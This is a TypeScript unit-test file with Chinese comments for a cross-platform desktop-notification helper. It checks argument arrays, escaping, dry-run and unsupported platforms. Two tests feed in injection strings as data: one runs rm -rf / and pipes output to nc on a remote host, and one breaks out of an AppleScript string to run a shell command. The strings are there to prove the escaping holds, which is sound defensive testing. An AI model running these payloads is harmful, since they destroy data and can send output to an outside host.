import { describe, expect, test } from "bun:test";
import { sendDesktopNotify } from "./desktop-notify";
import type { NotifyOutcome, NotifySpawn } from "./desktop-notify";

/** spawn spy：记录 (command, args) 调用。 */
function makeSpawnSpy(): { calls: { command: string; args: readonly string[] }[]; fn: NotifySpawn } {
  const calls: { command: string; args: readonly string[] }[] = [];
  return {
    calls,
    fn: (command, args) => {
      calls.push({ command, args });
      return undefined;
    },
  };
}

const isSent = (o: NotifyOutcome): o is Extract<NotifyOutcome, { status: "sent" }> =>
  o.status === "sent";
const isDry = (o: NotifyOutcome): o is Extract<NotifyOutcome, { status: "dry-run" }> =>
  o.status === "dry-run";

describe("sendDesktopNotify —— linux (notify-send)", () => {
  test("命令与参数逐项：notify-send + [title, body]，status=sent", () => {
    const spy = makeSpawnSpy();
    const out = sendDesktopNotify("标题", "正文", { platform: "linux", spawn: spy.fn });
    expect(isSent(out)).toBe(true);
    if (isSent(out)) {
      expect(out.command).toBe("notify-send");
      expect([...out.args]).toEqual(["标题", "正文"]);
    }
    expect(spy.calls).toHaveLength(1);
    expect(spy.calls[0]!.command).toBe("notify-send");
    expect([...spy.calls[0]!.args]).toEqual(["标题", "正文"]);
  });

  test("shell 元字符保持字面量（参数数组直达，不经 shell）", () => {
    const spy = makeSpawnSpy();
    const nasty = '$(rm -rf /) ; `id` && echo pwned | nc host 4444';
    sendDesktopNotify(nasty, "b", { platform: "linux", spawn: spy.fn });
    expect(spy.calls[0]!.command).toBe("notify-send");
    expect(spy.calls[0]!.args[0]).toBe(nasty); // 原样直达，无插值面
  });
});

describe("sendDesktopNotify —— darwin (osascript)", () => {
  test("命令与参数逐项：osascript -e AppleScript，含转义", () => {
    const spy = makeSpawnSpy();
    const out = sendDesktopNotify('He said "hi" \\ done', 'Bo"dy\\', {
      platform: "darwin",
      spawn: spy.fn,
    });
    expect(isSent(out)).toBe(true);
    expect(spy.calls).toHaveLength(1);
    expect(spy.calls[0]!.command).toBe("osascript");
    expect(spy.calls[0]!.args[0]).toBe("-e");
    // AppleScript 字符串字面量：\ → \\、" → \"
    expect(spy.calls[0]!.args[1]).toBe(
      'display notification "Bo\\"dy\\\\" with title "He said \\"hi\\" \\\\ done"',
    );
  });

  test("注入向量（引号截断 AppleScript）被转义失效", () => {
    const spy = makeSpawnSpy();
    const nasty = 'x" and do shell script "rm -rf /" and display dialog "';
    sendDesktopNotify("t", nasty, { platform: "darwin", spawn: spy.fn });
    const script = spy.calls[0]!.args[1]!;
    // 原始裸引号已全部转义：无法截断字面量注入 do shell script
    expect(script).not.toContain('x" and');
    expect(script).toContain('x\\" and do shell script \\"rm -rf /\\"');
  });
});

describe("sendDesktopNotify —— win32 (powershell)", () => {
  test("命令与参数逐项：powershell [-NoProfile, -NonInteractive, -Command, script]", () => {
    const spy = makeSpawnSpy();
    const out = sendDesktopNotify("Ti'tle", "Bo'dy", { platform: "win32", spawn: spy.fn });
    expect(isSent(out)).toBe(true);
    expect(spy.calls).toHaveLength(1);
    expect(spy.calls[0]!.command).toBe("powershell");
    const args = [...spy.calls[0]!.args];
    expect(args[0]).toBe("-NoProfile");
    expect(args[1]).toBe("-NonInteractive");
    expect(args[2]).toBe("-Command");
    const script = args[3]!;
    expect(script).toContain("ShowBalloonTip(5000, 'Ti''tle', 'Bo''dy',");
    // 单引号字面量转义：' → ''
    expect(script).not.toContain("'Ti'tle'");
  });
});

describe("sendDesktopNotify —— dry-run 与不可用平台", () => {
  test("dryRun：返回构造命令但不执行（spawn 零调用）", () => {
    const spy = makeSpawnSpy();
    const out = sendDesktopNotify("t", "b", { platform: "linux", spawn: spy.fn, dryRun: true });
    expect(isDry(out)).toBe(true);
    if (isDry(out)) {
      expect(out.command).toBe("notify-send");
      expect([...out.args]).toEqual(["t", "b"]);
    }
    expect(spy.calls).toHaveLength(0);
  });

  test("不可用平台 → 结构化 unavailable，spawn 零调用", () => {
    const spy = makeSpawnSpy();
    const out = sendDesktopNotify("t", "b", { platform: "freebsd", spawn: spy.fn });
    expect(out).toEqual({ status: "unavailable", reason: "unsupported platform: freebsd" });
    expect(spy.calls).toHaveLength(0);
  });

  test("缺省平台 = process.platform（与显式同参结果一致）", () => {
    const spyA = makeSpawnSpy();
    const spyB = makeSpawnSpy();
    const a = sendDesktopNotify("t", "b", { spawn: spyA.fn });
    const b = sendDesktopNotify("t", "b", { platform: process.platform, spawn: spyB.fn });
    expect(a).toEqual(b);
  });
});
